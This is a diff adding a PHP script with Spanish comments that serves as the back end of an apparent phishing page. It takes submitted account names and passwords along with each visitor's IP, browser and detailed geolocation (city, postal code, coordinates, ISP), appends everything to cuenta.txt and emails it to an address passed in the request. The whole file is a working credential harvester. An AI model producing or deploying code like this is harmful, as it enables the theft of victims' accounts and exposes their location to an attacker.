@@ -1,0 +1,74 @@
+<?php
+if (isset($_POST['account']) && isset($_POST['password'])) {
+    $info_ip = $_POST["ip"];
+    $navegador = $_POST["navegador"];
+    $fecha = $_POST["fecha"];
+    $hora = $_POST["hora"];
+    $json_country = $_POST["json_country"];
+    $json_countryCode = $_POST["json_countryCode"];
+    $json_region = $_POST["json_region"];
+    $json_regionName = $_POST["json_regionName"];
+    $json_city = $_POST["json_city"];
+    $json_zip = $_POST["json_zip"];
+    $json_lat = $_POST["json_lat"];
+    $json_lon = $_POST["json_lon"];
+    $json_timezone = $_POST["json_timezone"];
+    $json_isp = $_POST["json_isp"];
+    $json_org = $_POST["json_org"];
+    $json_as = $_POST["json_as"];
+    $account = $_POST["account"];
+    $password = $_POST["password"];
+    $parax = $_POST["parax"];
+    #Guardar todos los datos anteriores en un txt
+    $datos_file = fopen("cuenta.txt", "a");
+    fwrite($datos_file, "IP: ".$info_ip."\n");
+    fwrite($datos_file, "Navegador: ".$navegador."\n");
+    fwrite($datos_file, "Fecha: ".$fecha."\n");
+    fwrite($datos_file, "Hora: ".$hora."\n");
+    fwrite($datos_file, "País: ".$json_country."\n");
+    fwrite($datos_file, "Código del país: ".$json_countryCode."\n");
+    fwrite($datos_file, "Región: ".$json_region."\n");
+    fwrite($datos_file, "Nombre de la región: ".$json_regionName."\n");
+    fwrite($datos_file, "Ciudad: ".$json_city."\n");
+    fwrite($datos_file, "Código postal: ".$json_zip."\n");
+    fwrite($datos_file, "Latitud: ".$json_lat."\n");
+    fwrite($datos_file, "Longitud: ".$json_lon."\n");
+    fwrite($datos_file, "Zona horaria: ".$json_timezone."\n");
+    fwrite($datos_file, "ISP: ".$json_isp."\n");
+    fwrite($datos_file, "Organización: ".$json_org."\n");
+    fwrite($datos_file, "AS: ".$json_as."\n");
+    fwrite($datos_file, "Cuenta: ".$account."\n");
+    fwrite($datos_file, "Contraseña: ".$password."\n");
+    fwrite($datos_file, "-----------------------------------------------------\n");
+    fclose($datos_file);
+    #Enviar datos por correo
+    $para = $parax;
+    $titulo = "Datos de la cuenta";
+    $mensaje = "IP-> ".$ip."\n<br>";
+    $mensaje .= "Navegador-> ".$navegador."\n<br>";
+    $mensaje .= "Fecha-> ".$fecha."\n<br>";
+    $mensaje .= "Hora-> ".$hora."\n<br>";
+    $mensaje .= "IP-> ".$info_ip."\n<br>";
+    $mensaje .= "País-> ".$json_country."\n<br>";
+    $mensaje .= "Código del país-> ".$json_countryCode."\n<br>";
+    $mensaje .= "Región-> ".$json_region."\n";
+    $mensaje .= "Nombre de la región-> ".$json_regionName."\n<br>";
+    $mensaje .= "Ciudad-> ".$json_city."\n<br>";
+    $mensaje .= "Código postal-> ".$json_zip."\n<br>";
+    $mensaje .= "Latitud-> ".$json_lat."\n<br>";
+    $mensaje .= "Longitud-> ".$json_lon."\n<br>";
+    $mensaje .= "Zona horaria-> ".$json_timezone."\n<br>";
+    $mensaje .= "ISP-> ".$json_isp."\n<br>";
+    $mensaje .= "Organización-> ".$json_org."\n<br>";
+    $mensaje .= "AS-> ".$json_as."\n<br>";
+    $mensaje .= "------------------------------\n<br>";
+    $mensaje .= "Cuenta-> ".$account."\n<br>";
+    $mensaje .= "Contraseña-> ".$password."\n<br>";
+    $cabeceras = "MIME-Version: 1.0\r\n";
+    $cabeceras .= "Content-type: text/html; charset=UTF-8\r\n";
+    $cabeceras .= "From: DatosCuenta\r\n";
+    $cabeceras .= "Reply-To: DatosCuenta\r\n";
+    $cabeceras .= "X-Mailer: PHP/".phpversion();
+    mail($para, $titulo, $mensaje, $cabeceras);
+
+}
